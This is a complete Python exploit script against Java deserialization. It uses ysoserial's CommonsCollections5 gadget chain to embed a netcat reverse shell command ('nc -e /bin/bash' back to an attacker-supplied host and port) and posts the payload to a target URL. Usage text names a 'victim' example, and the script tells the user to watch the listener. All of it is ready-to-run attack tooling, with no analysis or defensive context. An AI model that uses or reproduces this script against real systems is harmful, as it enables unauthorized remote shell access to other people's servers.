import requests, subprocess, sys, os, base64

if len(sys.argv) < 4:
    print(f"Usage: {sys.argv[0]} <URL> <LHOST> <LPORT>")
    print(f"Example: {sys.argv[0]} http://victim:8080/api 10.0.0.1 4444")
    sys.exit(1)

TARGET_URL = sys.argv[1]
LHOST = sys.argv[2]
LPORT = sys.argv[3]

print("[*] Java Deserialization Exploit")
print(f"[*] Target: {TARGET_URL}")
print(f"[*] LHOST: {LHOST}, LPORT: {LPORT}")

shell = f"nc -e /bin/bash {LHOST} {LPORT}"
COMMAND = shell

print("[*] Generating payload...")
try:
    if not os.path.exists("ysoserial.jar"):
        print("[!] Download ysoserial.jar first!")
        sys.exit(1)
    
    # Generate payload
    cmd = ["java", "-jar", "ysoserial.jar", "CommonsCollections5", COMMAND]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    payload, error = process.communicate()
    
    if process.returncode != 0:
        print(f"[!] Failed: {error.decode()[:50]}")
        sys.exit(1)
    
    print(f"[+] Payload: {len(payload)} bytes")
    
    # Send it
    print("[*] Sending exploit...")
    r = requests.post(TARGET_URL, data=payload, 
                     headers={"Content-Type": "application/octet-stream"}, 
                     timeout=10)
    
    print(f"[+] Status: {r.status_code}")
    if r.status_code == 200:
        print("[!] 200 OK check your netcat listener")
    else:
        print(f"[?] Got {r.status_code} = try other gadget chains")
        
except Exception as e:
    print(f"[!] Error: {e}")
